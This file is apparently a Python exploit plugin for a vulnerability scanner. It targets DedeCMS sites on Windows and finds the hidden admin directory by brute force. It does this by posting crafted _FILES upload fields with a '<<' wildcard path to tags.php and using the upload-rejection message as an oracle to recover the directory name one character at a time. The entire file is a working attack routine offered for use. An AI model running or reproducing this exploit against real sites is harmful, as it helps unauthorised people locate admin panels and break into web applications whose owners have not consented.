#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

import itertools
from script import Script, SERVICE_PORT_MAP

class POC(Script):
    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.WEB
        self.name = 'dedecms win manager'
        self.keyword = ['dedecms', 'win', 'manager']
        self.info = 'Find manager for dedecms'
        self.type = 'burst'
        self.level = 'medium'
        self.refer = 'https://xz.aliyun.com/t/2064'
        Script.__init__(self, target=target, service_type=self.service_type)

    def prove(self):
        self.get_url()
        if self.base_url:
            characters = "abcdefghijklmnopqrstuvwxyz0123456789_!#"
            _data = {
                "_FILES[mochazz][tmp_name]": "./{p}<</images/adminico.gif",
                "_FILES[mochazz][name]": 0,
                "_FILES[mochazz][size]": 0,
                "_FILES[mochazz][type]": "image/gif"
            }
            path_list = list(set([
                self.url_normpath(self.base_url, '/'),
                self.url_normpath(self.base_url, '../dedecms/'),
                self.url_normpath(self.url, 'dedecms/'),
                self.url_normpath(self.url, '../dedecms/'),
            ]))
            for path in path_list:
                url = path + 'tags.php'
                back_dir = ""
                flag = 0
                res = self.curl('get', url)
                if res!=None and res.status_code ==200:
                    for num in range(1, 7):
                        if flag ==1 :
                            break
                        for pre in itertools.permutations(characters, num):
                            pre = ''.join(list(pre))
                            _data["_FILES[mochazz][tmp_name]"] = _data["_FILES[mochazz][tmp_name]"].format(p=pre)
                            r = self.curl('post', url, data=_data)
                            if r!=None:
                                if r.status_code == 405:
                                    return
                                if "Upload filetype not allow !" not in r.text and r.status_code == 200:
                                    flag = 1
                                    back_dir = pre
                                    _data["_FILES[mochazz][tmp_name]"] = "./{p}<</images/adminico.gif"
                                    break
                                else:
                                    _data["_FILES[mochazz][tmp_name]"] = "./{p}<</images/adminico.gif"
                    flag = 0
                    x = 0
                    for i in range(30):
                        if flag == 1:
                            x = i
                            break
                        for ch in characters:
                            if ch == characters[-1]:
                                flag = 1
                                x = i
                                break
                            _data["_FILES[mochazz][tmp_name]"] = _data["_FILES[mochazz][tmp_name]"].format(p=back_dir + ch)
                            r = self.curl('post', url, data=_data)
                            if r!=None:
                                if r.status_code == 405:
                                    return
                                if "Upload filetype not allow !" not in r.text and r.status_code == 200:
                                    back_dir += ch
                                    _data["_FILES[mochazz][tmp_name]"] = "./{p}<</images/adminico.gif"
                                    break
                                else:
                                    _data["_FILES[mochazz][tmp_name]"] = "./{p}<</images/adminico.gif"

                    if x < 29 and flag ==1:
                        self.flag = 1
                        self.req.append({"url": path+ '/'+back_dir})
                        self.res.append({"info": path+'/'+ back_dir, "key": 'dede_manager'})
